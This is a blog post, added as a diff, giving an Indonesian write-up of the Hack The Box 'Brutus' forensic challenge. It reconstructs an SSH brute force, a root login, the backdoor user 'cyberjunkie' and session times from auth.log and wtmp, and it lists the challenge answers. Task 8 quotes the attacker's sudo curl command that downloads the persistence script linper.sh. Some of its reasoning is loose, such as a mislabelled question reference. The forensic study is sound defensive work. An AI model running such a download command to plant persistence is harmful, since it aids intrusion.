@@ -1,0 +1,128 @@
+---
+title: "Write-Up Hack The Box Brutus"
+desc: "Write-up HTB Sherlock Brutus: analisis auth.log dan wtmp untuk melacak brute-force SSH, privilege escalation, persistence, dan command execution."
+image: "/blog/hack-the-box-brutus/img-01.png"
+tags: ["ctf", "writeup", "forensic"]
+date: "2026-02-23"
+isPublished: true
+---
+
+# Write-Up Hack The Box Brutus
+
+### Skenario
+
+In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
+
+### Pendahuluan
+
+Disini saya mendapatkan file zip yang dimana saat ingin extract akan dimintai password, password bisa didapatkan dari htbnya dan passwordnya adalah hacktheblue, disini saya mengextract menggunakan 7z karena extract bawaan windows/winrar tidak bisa mengextractnya. Isi dari foldernya ada file utmp.py, wtmp dan auth.log
+
+![screenshot](/blog/hack-the-box-brutus/img-01.png)
+
+### Task 1
+
+Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?
+
+Answer: 65.2.161.68
+
+Explain: Disini saya pertama-tama membuka file auth.log dan menemukan bahwa attackers melakukan brute force pada tanggal 6 maret di jam 06:31:31 ke ip 172.31.35.28 dan ipnya adalah 65.2.161.68
+
+![screenshot](/blog/hack-the-box-brutus/img-02.png)
+
+### Task 2
+
+The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
+
+Answer: root
+
+Explain: Disini saya menganalisa file auth.log lagi dan menemukan bahwa username of the account adalah root, hal ini terbukti dari isi log yang dimana attackers berhasil masuk dan login sebagai root dari ip 65.2.161.68
+
+![screenshot](/blog/hack-the-box-brutus/img-03.png)
+
+### Task 3
+
+Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.
+
+Answer: 2024-03-06 06:32:45
+
+Explain: Karena disoal disuruh cari didalam file wtmp, jadi saya menganalisa file wtmp, saya menggunakan perintah
+
+```bash
+utmpdump wtmp
+```
+
+![screenshot](/blog/hack-the-box-brutus/img-04.png)
+
+disini saya mencari manual login yang berarti interactive shell dan dari file wtmp terdapat
+
+`[7] [02549] [ts/1] [root] [pts/1] [65.2.161.68] [2024-03-06T06:32:45,387923+00:00]`
+
+dan
+
+`[7] [02667] [ts/1] [cyberjunkie] [pts/1] [65.2.161.68] [2024-03-06T06:37:35,475575+00:00]`
+
+karena type \[7\] itu adalah USER. Pertanyaannya yang mana yang manua login? login dari cyberjunkie terlihat seperti user interaktif (attacker foothold), yang artinya login dari root lah yang merupakan manual login jadi UTC Timestampnya adalah 2024-03-06 06:32:45
+
+### Task 4
+
+SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
+
+Answer: 37
+
+Explain: Dari wtmp, attackers login sebagai root yang artinya SSH login berhasil dan terminal dibuat. Untuk mencari session number dari SSH login disini saya menggunakan
+
+```bash
+grep "New session" auth.log
+```
+
+![screenshot](/blog/hack-the-box-brutus/img-05.png)
+
+Disini terdapat 3 session yang sama dari root, nah disini saya tinggal mencocokan waktunya saja, karena soal menanyakan dari question 2 dan jawaban dari question 2 itu adalah 06:32:45 jadi saya cocokan saja dan session numbernya adalah 37 karena waktunya sama
+
+### Task 5
+
+The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
+
+Answer: Didalam file utmp dibagian akhirnya terdapat
+
+![screenshot](/blog/hack-the-box-brutus/img-06.png)
+
+Disini attackers login sebagai root, lalu muncul username cyberjunkie dan ipnya pun sama, jadi pertama-tama attacker login sebagai root kemudian membuat user baru lalu memberikan privilege dan login menggunakan user baru untuk akses stabil.
+
+Di file auth.log juga terdapat bukti bahwa attackers membuat user baru dan ini bernama cyberjunkie
+
+![screenshot](/blog/hack-the-box-brutus/img-07.png)
+
+### Task 6
+
+What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
+
+Answer: T1136.001
+
+Explain: Untuk mencari jawaban ini, saya mencarinya di google
+
+![screenshot](/blog/hack-the-box-brutus/img-08.png)
+
+Disana tertera bahwa IDnya adalah T1136.001 karena attackers membuat new account di lokal
+
+### Task 7
+
+What time did the attacker's first SSH session end according to auth.log?
+
+Answer: 2024-03-06 06:37:24
+
+Explain: Karena yang ditanyakan adalah first SSH session end jadi saya mencari pertama kali attackers login menggunakan SSH dan di file wtmp attackers berhasil login di SSH pada waktu 06:32:45 dan setelahnya terdapat type \[8\] yang artinya DEAD dan itulah pertama kali SSH session end, waktunya adalah 2024-03-06 06:37:24
+
+![screenshot](/blog/hack-the-box-brutus/img-09.png)
+
+### Task 8
+
+The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
+
+Answer: /usr/bin/curl [https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh](https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh)
+
+Explain: Disini saya mencari kata https di file auth.log
+
+![screenshot](/blog/hack-the-box-brutus/img-10.png)
+
+dan terdapat  command seperti itu yang dimana user cyberjunkie menggunakan sudo juga yang artinya diberi privilege tinggi dan dowload script dari github dan scriptnya bernama [linper.sh](http://linper.sh), mungkin semacam enumeration/persistence tool
